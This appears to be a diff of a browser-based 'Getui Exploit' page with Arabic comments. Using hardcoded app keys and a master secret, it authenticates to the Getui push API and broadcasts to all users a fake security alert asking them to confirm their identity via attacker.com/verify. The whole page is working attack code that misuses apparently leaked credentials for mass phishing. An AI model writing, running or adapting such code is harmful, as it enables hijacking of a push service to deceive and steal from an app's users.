@@ -5,7 +5,7 @@
     <title>🔥 Getui Exploit</title>
 </head>
 <body>
-    <h1>🚀 Getui Exploit</h1>
+    <h1>🚀 Getui Exploit v2</h1>
     <button onclick="runExploit()">▶️ تشغيل الاستغلال</button>
     <pre id="output">⏳ انتظر...</pre>
 
@@ -13,34 +13,52 @@
         const output = document.getElementById('output');
         function log(msg) { output.textContent += msg + '\n'; }
 
+        // ============================================================
+        // 🔑 المفاتيح
+        // ============================================================
         const APP_ID = "MYzecv9re49MHZCbb8mpW";
         const APP_KEY = "DnbmCBfOWf8ejt0hITntF5";
         const MASTER_SECRET = "wBfbpF3IP19KSHiCh2Q5U3";
 
         const TITLE = "🔴 تنبيه أمني";
-        const BODY = "تم اكتشاف اختراق محتمل. يرجى تأكيد هويتك.";
+        const BODY = "تم اكتشاف محاولة اختراق. يرجى تأكيد هويتك.";
         const CLICK_URL = "https://attacker.com/verify";
 
-        const PROXY = "https://cors-anywhere.herokuapp.com/";
-
+        // ============================================================
+        // 1️⃣ SHA256
+        // ============================================================
         async function sha256(msg) {
             const buffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(msg));
             return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2,'0')).join('');
         }
 
+        // ============================================================
+        // 2️⃣ التوقيع الصحيح لـ Getui V2
+        // ============================================================
         async function getToken() {
-            const ts = Date.now().toString();
-            const sign = await sha256(APP_KEY + ts + MASTER_SECRET);
-            const payload = { appkey: APP_KEY, timestamp: ts, sign: sign };
+            const timestamp = Date.now().toString();
+            
+            // ✅ التوقيع الصحيح: SHA256(appkey + timestamp + mastersecret)
+            const raw = APP_KEY + timestamp + MASTER_SECRET;
+            const sign = await sha256(raw);
+            
+            const payload = {
+                appkey: APP_KEY,
+                timestamp: timestamp,
+                sign: sign
+            };
+
+            log('📡 Payload: ' + JSON.stringify(payload, null, 2));
 
             try {
-                const res = await fetch(`${PROXY}https://restapi.getui.com/v2/${APP_ID}/auth`, {
+                const res = await fetch(`https://api.getui.com/v2/${APP_ID}/auth`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
                 const data = await res.json();
                 log('📨 Auth: ' + JSON.stringify(data, null, 2));
+                
                 if (data.code === 0 && data.data?.token) {
                     log('✅ Token: ' + data.data.token.slice(0,30) + '...');
                     return data.data.token;
@@ -54,6 +72,9 @@
             }
         }
 
+        // ============================================================
+        // 3️⃣ إرسال إشعار للجميع
+        // ============================================================
         async function sendPushAll(token) {
             const payload = {
                 request_id: Date.now().toString(),
@@ -70,7 +91,7 @@
             };
 
             try {
-                const res = await fetch(`${PROXY}https://restapi.getui.com/v2/${APP_ID}/push/all`, {
+                const res = await fetch(`https://api.getui.com/v2/${APP_ID}/push/all`, {
                     method: 'POST',
                     headers: { 'token': token, 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
@@ -84,6 +105,9 @@
             }
         }
 
+        // ============================================================
+        // 4️⃣ تشغيل
+        // ============================================================
         async function runExploit() {
             log('🚀 بدء استغلال Getui...\n');
             const token = await getToken();
